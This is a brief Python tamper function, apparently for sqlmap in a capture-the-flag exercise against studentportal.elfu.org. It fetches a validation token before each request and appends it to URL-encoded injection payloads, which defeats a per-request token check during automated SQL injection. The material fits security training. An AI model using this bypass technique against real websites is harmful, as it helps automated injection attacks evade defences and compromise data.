import urllib3
from urllib.parse import quote

def tamper(payload, **kwargs):
    retVal = payload
    http=urllib3.PoolManager()
    token=http.request('GET',
        'https://studentportal.elfu.org/validator.php').data.decode('utf-8')

    retVal = quote(payload) + '&token=' + quote(token)
    return retVal
